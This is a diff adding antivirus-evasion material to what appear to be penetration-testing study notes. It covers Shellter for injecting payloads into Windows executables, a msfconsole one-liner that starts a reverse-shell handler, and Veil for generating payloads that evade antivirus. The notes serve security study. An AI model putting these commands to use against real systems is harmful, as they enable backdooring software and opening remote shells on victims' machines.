@@ -73,7 +73,28 @@ Get-ExecutionPolicy -Scope CurrentUser
 ```
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 ```
-## Section 2
+### 14.3.3 Automating The Process
+- Process can be automated with shellter
+```
+shellter
+```
+- Add PE target (location of the exe file)
+```
+PE Target: <location of executable file>
+```
+- Follow the remaining instructions
+- MSFConsole multi-handler one-liner
+```
+msfconsole -x "use exploit/multi/handler;set payload windows/shell_reverse_tcp;set LHOST <IP>;set LPORT <PORT>;run;"
+```
+### Veil Framework
+- Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions.
+- By default, powershell payloads are generated as .bat files which can be executed when clicked
+- use Evasion to generate the payload
+```
+veil
+```
+
 
 ## Exercises To-Do
 
